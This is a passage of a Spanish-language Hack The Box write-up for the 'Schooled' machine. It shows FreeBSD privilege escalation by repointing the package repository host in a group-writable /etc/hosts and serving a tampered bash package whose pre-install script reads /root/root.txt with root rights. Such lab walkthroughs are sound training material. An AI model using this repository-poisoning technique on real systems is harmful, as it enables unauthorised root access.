&lt;p&gt;Con &lt;code&gt;sudo -l -l&lt;/code&gt; vemos que tenemos permisos root para ejecutar el comando &lt;code&gt;pkg update&lt;/code&gt; y &lt;code&gt;pkg install *&lt;/code&gt;. Verificamos la configuracion de &lt;code&gt;pkg&lt;/code&gt; y vemos que el repositorio está en &lt;code&gt;devops.htb&lt;/code&gt;, intentamos crear un archivo de configuracion alternativo pero no tenemos permisos suficientes. La direccion IP de &lt;code&gt;devops.htb&lt;/code&gt; es local.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;amie@Schooled:~ $ sudo -l -l
User jamie may run the following commands on Schooled:

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
        /usr/sbin/pkg update

Sudoers entry:
    RunAsUsers: ALL
    Options: !authenticate
    Commands:
        /usr/sbin/pkg install *
jamie@Schooled:~ $ cat /etc/pkg/FreeBSD.conf
&lt;span class=&#34;c1&#34;&gt;# $FreeBSD$&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# To disable this repository, instead of modifying or removing this file,&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# create a /usr/local/etc/pkg/repos/FreeBSD.conf file:&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#   mkdir -p /usr/local/etc/pkg/repos&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#   echo &amp;#34;FreeBSD: { enabled: no }&amp;#34; &amp;gt; /usr/local/etc/pkg/repos/FreeBSD.conf&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#&lt;/span&gt;

FreeBSD: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
  url: &lt;span class=&#34;s2&#34;&gt;&amp;#34;pkg+http://devops.htb:80/packages&amp;#34;&lt;/span&gt;,
  mirror_type: &lt;span class=&#34;s2&#34;&gt;&amp;#34;srv&amp;#34;&lt;/span&gt;,
  signature_type: &lt;span class=&#34;s2&#34;&gt;&amp;#34;none&amp;#34;&lt;/span&gt;,
  fingerprints: &lt;span class=&#34;s2&#34;&gt;&amp;#34;/usr/share/keys/pkg&amp;#34;&lt;/span&gt;,
  enabled: yes
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
jamie@Schooled:~ $ mkdir -p /usr/local/etc/pkg/repos
mkdir: /usr/local/etc/pkg: Permission denied
jamie@Schooled:~ $ cat /etc/hosts&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep devops.htb
192.168.1.14            devops.htb
jamie@Schooled:~ $
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Despues de dar algunas vueltas verificamos los permisos del archivo &lt;code&gt;/etc/hosts&lt;/code&gt; y observamos que el grupo &lt;code&gt;wheel&lt;/code&gt; al que &lt;code&gt;jamie&lt;/code&gt; pertenece tiene permisos sobre este archivo, por lo que podemos modificar la direccion IP del repositorio.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jamie@Schooled:~ $ ls -ld /etc/hosts
-rw-rw-r--  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root  wheel  &lt;span class=&#34;m&#34;&gt;1098&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 15:47 /etc/hosts
jamie@Schooled:~ $
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;pkg---repo&#34;&gt;PKG - Repo&lt;/h2&gt;
&lt;h3 id=&#34;bash-package&#34;&gt;Bash Package&lt;/h3&gt;
&lt;p&gt;Iniciamos ejecutando &lt;code&gt;pkg create -a&lt;/code&gt; lo cual obtendra todos los paquetes instalados dentro de la maquina, obtenemos el archivo bash (podria ser otro) y cancelamos el proceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jamie@Schooled:~ $ mkdir packages
jamie@Schooled:~ $ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; packages/
jamie@Schooled:~/packages $ pkg create -a
Loading the package list...
Creating package &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; adwaita-icon-theme-3.38.0

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

Creating package &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; bash-5.1.4
Creating package &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; bash-completion-2.11,2
Creating package &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; ca_root_nss-3.58
Creating package &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; cairo-1.16.0_1,3
^C
jamie@Schooled:~/packages $

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Una vez con el archivo target, extraemos el contenido de &lt;code&gt;bash-5.1.4.txz&lt;/code&gt; y se crearan dos archivos y una carpeta, finalmente eliminamos o movemos el archivo &lt;code&gt;bash-5.1.4.txz&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jamie@Schooled:~/packages $ mv bash-5.1.4.txz ../
jamie@Schooled:~/packages $ rm *
jamie@Schooled:~/packages $ mv ../bash-5.1.4.txz .
jamie@Schooled:~/packages $ tar -xJf bash-5.1.4.txz
tar: Removing leading &lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; from member names
jamie@Schooled:~/packages $ ls
+COMPACT_MANIFEST       +MANIFEST               bash-5.1.4.txz          usr
jamie@Schooled:~/packages $ rm bash-5.1.4.txz
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pre-script&#34;&gt;Pre-script&lt;/h3&gt;
&lt;p&gt;Dentro del archivo &lt;code&gt;+MANIFEST&lt;/code&gt; es posible agregar comandos cuando un paquete es instalado utilizando el objeto &lt;code&gt;scripts&lt;/code&gt; dentro de este, basados de la informacion de un &lt;a href=&#34;https://hackmd.io/@dch/HkwIhv6x7#whats-in-a-pkg8&#34;&gt;ejemplo&lt;/a&gt;, agregamos &lt;code&gt;pre-scripts&lt;/code&gt; al archivo con un comando de prueba obteniendo la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;scripts&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;pre-install&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;cat /root/root.txt &amp;gt; /home/jamie/root.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
     &lt;span class=&#34;err&#34;&gt;...&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;...&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Además de ello modificamos la version al inicio de los archivos &lt;code&gt;+MANIFEST&lt;/code&gt; y &lt;code&gt;+COMPACT_MANIFEST&lt;/code&gt; a una más alta o reciente.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-dif&#34; data-lang=&#34;dif&#34;&gt;- &amp;quot;version&amp;quot;:&amp;quot;5.1.4&amp;quot;
+ &amp;quot;version&amp;quot;:&amp;quot;6.1.4&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Luego de esto creamos un nuevo archivo con todos los archivos y carpetas con el nombre &lt;code&gt;bash-6.1.4.txz&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jamie@Schooled:~/packages $ tar cJf bash-6.1.4.txz *
jamie@Schooled:~/packages $ ls
+COMPACT_MANIFEST       +MANIFEST               bash-6.1.4.txz          usr
jamie@Schooled:~/packages $ mkdir tmp
jamie@Schooled:~/packages $ mv bash-6.1.4.txz tmp
jamie@Schooled:~/packages $ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; tmp/
jamie@Schooled:~/packages/tmp $ ls
bash-6.1.4.txz
jamie@Schooled:~/packages/tmp $
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;repo-files&#34;&gt;Repo Files&lt;/h2&gt;
&lt;p&gt;Ejecutamos &lt;code&gt;pkg repo .&lt;/code&gt; para crear todos los archivos necesarios para un repositorio con informacion de los paquetes dentro del directorio actual en este caso solo el paquete &lt;code&gt;bash&lt;/code&gt; que contiene el comando ingresado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jamie@Schooled:~/packages/tmp $ ls
bash-6.1.4.txz
jamie@Schooled:~/packages/tmp $ pkg repo .
Creating repository in .: 100%
Packing files &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; repository: 100%
jamie@Schooled:~/packages/tmp $ ls 
bash-6.1.4.txz  meta.conf       meta.txz        packagesite.txz
jamie@Schooled:~/packages/tmp $
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Comprimimos la carpeta completa y la enviamos con &lt;a href=&#34;https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/&#34;&gt;netcat&lt;/a&gt; hacia nuestra maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jamie@Schooled:~/packages/tmp $ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..
jamie@Schooled:~/packages $ ls 
+COMPACT_MANIFEST       +MANIFEST               tmp                     usr
jamie@Schooled:~/packages $ tar -zcvf a.tar.gz tmp/
a tmp
a tmp/meta.txz
a tmp/packagesite.txz
a tmp/bash-6.1.4.txz
a tmp/meta.conf
jamie@Schooled:~/packages $ ls a.tar.gz 
a.tar.gz
jamie@Schooled:~/packages $ 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;repo-server&#34;&gt;Repo Server&lt;/h2&gt;
&lt;p&gt;En nuestra maquina descomprimimos los archivos y creamos un mini servidor con python. Hay que mencionar que la carpeta con la informacion del repositorio debe llevar el nombre de &lt;code&gt;packages&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/htb/schooled/repo2  
╰─➤  ls
a.tar.gz
╭─kali@kali ~/htb/schooled/repo2  
╰─➤  tar -xvf a.tar.gz
tmp/
tmp/meta.txz
tar: tmp/meta.txz: &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; stamp 2021-04-09 06:05:48 is 53.360748238 s in the future
tmp/packagesite.txz
tar: tmp/packagesite.txz: &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; stamp 2021-04-09 06:05:48 is 53.360611328 s in the future
tmp/bash-6.1.4.txz
tar: tmp/bash-6.1.4.txz: &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; stamp 2021-04-09 06:05:09 is 14.353302812 s in the future
tmp/meta.conf
tar: tmp/meta.conf: &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; stamp 2021-04-09 06:05:48 is 53.353078807 s in the future
tar: tmp: &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt; stamp 2021-04-09 06:05:48 is 53.353037336 s in the future
╭─kali@kali ~/htb/schooled/repo2  
╰─➤  ls
a.tar.gz  tmp
╭─kali@kali ~/htb/schooled/repo2  
╰─➤  mv tmp packages
╭─kali@kali ~/htb/schooled/repo2  
╰─➤  sudo python3 -m http.server &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
Serving HTTP on 0.0.0.0 port &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ...
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;devopshtb&#34;&gt;Devops.htb&lt;/h2&gt;
&lt;p&gt;En la maquina (schooled) editamos el archivo &lt;code&gt;/etc/hosts&lt;/code&gt; agregando nuestra direccion IP al dominio &lt;code&gt;devops.htb&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jamie@Schooled:~/packages $ cat /etc/hosts&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep devops
10.10.14.145            devops.htb
jamie@Schooled:~/packages $
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;install-pkg--roottxt&#34;&gt;Install pkg &amp;gt; root.txt&lt;/h2&gt;
&lt;p&gt;Finalmente ejecutamos &lt;code&gt;pkg update&lt;/code&gt; y &lt;code&gt;pkg install bash&lt;/code&gt;, este ultimo comando ejecutará &lt;code&gt;cat /root/root.txt &amp;gt; /home/jamie/root.txt&lt;/code&gt; por lo que podremos leer nuestra flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
